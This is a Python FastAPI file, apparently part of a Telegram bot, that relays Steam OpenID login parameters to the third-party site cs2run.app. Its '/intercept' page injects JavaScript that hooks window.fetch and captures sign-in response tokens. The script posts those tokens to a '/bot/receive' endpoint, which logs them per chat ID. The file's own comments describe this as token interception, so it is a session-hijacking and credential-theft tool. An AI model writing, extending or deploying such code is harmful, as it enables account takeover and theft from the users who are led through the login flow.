# steam_auth.py

from fastapi import APIRouter, Request, Query
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
import urllib.parse
import json

router = APIRouter()

SELF_URL = "https://tg-bot-test-gkbp.onrender.com"

# -------------------------------
# 1️⃣ Вход → Steam
# -------------------------------
@router.get("/auth/login")
async def auth_login(chat_id: int):
    callback_url = f"{SELF_URL}/auth/callback?chat_id={chat_id}"

    steam_url = (
        "https://steamcommunity.com/openid/login?"
        "openid.ns=http://specs.openid.net/auth/2.0&"
        "openid.mode=checkid_setup&"
        "openid.claimed_id=http://specs.openid.net/auth/2.0/identifier_select&"
        "openid.identity=http://specs.openid.net/auth/2.0/identifier_select&"
        f"openid.return_to={urllib.parse.quote(callback_url)}&"
        f"openid.realm={urllib.parse.quote(SELF_URL)}"
    )

    return RedirectResponse(steam_url)


# -------------------------------
# 2️⃣ Steam → твой сервер → cs2run
# -------------------------------
@router.get("/auth/callback")
async def auth_callback(request: Request, chat_id: int = Query(...)):
    steam_params = dict(request.query_params)

    print("\n🧪 STEAM CALLBACK PARAMS:\n", steam_params, "\n")

    # Страница-перехватчик
    final_url = f"{SELF_URL}/intercept?chat_id={chat_id}"

    # Формируем редирект в cs2run
    query = {
        "returnUrl": final_url,
        **steam_params
    }

    encoded = urllib.parse.urlencode(query, safe=":/?=&")

    redirect_url = f"https://cs2run.app/auth/1/start-sign-in/?{encoded}"

    print("\n🚀 REDIRECT TO CS2RUN:\n", redirect_url, "\n")

    return RedirectResponse(redirect_url)


# -------------------------------
# 3️⃣ Перехват токенов в браузере
# -------------------------------
@router.get("/intercept")
async def intercept(chat_id: int):
    return HTMLResponse(f"""
<!DOCTYPE html>
<html>
<head><title>Authorizing...</title></head>
<body>

<script>
(function() {{
    const origFetch = window.fetch;

    window.fetch = async function() {{
        const res = await origFetch.apply(this, arguments);

        try {{
            if (arguments[0] && arguments[0].includes('/auth/1/sign-in')) {{
                const clone = res.clone();
                const data = await clone.json();

                await fetch('/bot/receive?chat_id={chat_id}', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify(data)
                }});
            }}
        }} catch (e) {{}}

        return res;
    }};
}})();
</script>

<h3>🔐 Авторизация…</h3>
<p>Пожалуйста, подождите</p>

</body>
</html>
""")


# -------------------------------
# 4️⃣ Приём токенов сервером
# -------------------------------
@router.post("/bot/receive")
async def receive_tokens(chat_id: int, payload: dict):
    print("\n🔥 GOT TOKENS FOR CHAT", chat_id, ":\n", json.dumps(payload, indent=2), "\n")
    return {"ok": True}